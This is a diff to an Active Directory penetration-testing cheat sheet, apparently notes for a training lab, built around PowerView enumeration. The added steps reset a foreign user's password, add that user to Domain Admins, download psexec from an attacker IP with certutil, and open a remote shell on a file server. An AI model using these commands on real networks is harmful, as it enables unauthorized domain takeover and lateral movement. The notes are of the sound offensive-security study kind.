@@ -136,17 +136,17 @@ Download PowerView from [here](https://raw.githubusercontent.com/PowerShellMafia
 Import-Module .\PowerView.ps1
 ```
 
-### Enumerate Computers
+### Enumerate Hostnames & IPs of Computers
 
 ```powershell
-Get-DomainComputer | select name, dnshostname, operatingsystem
+Get-DomainComputer -Domain ops.comply.com  | select name, dnshostname, operatingsystem
 ```
 
 ```bash
-nslookup appsrv01.corp1.com
+nslookup jump09.ops.comply.com
 
-#Name:    appsrv01.corp1.com
-#Address:  192.168.139.6
+#Name:    jum09.ops.comply.com
+#Address:  172.16.218.167
 ```
 
 ### Enumerate Users
@@ -957,9 +957,26 @@ Get-DomainGroup -Domain corp1.com | Select samaccountname
 
 * Identifying Foreign Group Membership
   * User from another domain or forest that is a member of a group inside the target forest
+  *   ```powershell
+      Get-DomainForeignGroupMember -Domain corp2.com
+      Convert-SidToName S-1-5-21-1416213050-106196312-571527550-1107
+      # complyedge\jim 
+      ```
+
+
+* Change Password of said account & add it to Domain Admin group so we can access it from our DC host
+  *   ```powershell
+      net user jim P@ssw0rd /domain
+      net group "Domain Admins" jim /add /domain
+      runas /user:complyedge\jim powershell
+      ```
+
+
+* In new Powershell Window as jim:
   * ```powershell
-    Get-DomainForeignGroupMember -Domain corp2.com
-    Convert-SidToName S-1-5-21-634106289-3621871093-708134407-1110
+    certutil -urlcache -f http://192.168.45.160/psexec_64.exe psexec_64.exe
+    .\psexec_64.exe \\file06.ops.comply.com cmd
     ```
 
 </details>
+
